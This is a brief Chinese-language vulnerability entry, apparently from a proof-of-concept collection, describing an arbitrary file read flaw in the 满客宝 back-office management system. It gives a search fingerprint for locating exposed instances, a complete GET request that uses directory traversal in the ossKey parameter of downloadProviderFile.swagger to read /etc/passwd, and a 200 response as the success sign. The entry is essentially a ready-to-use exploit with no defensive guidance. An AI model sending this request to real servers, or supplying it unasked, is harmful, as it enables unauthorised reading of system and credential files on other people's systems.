# 满客宝后台管理系统downloadProviderFile存在任意文件读取漏洞

满客宝后台管理系统 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="满客宝后台管理系统"`
- **请求**：`GET /warehouse/api/v1/provider/downloadProviderFile.swagger?fileName=&ossKey=/../../../../../../../../../../../etc/passwd HTTP/1.1`
- **响应特征**：200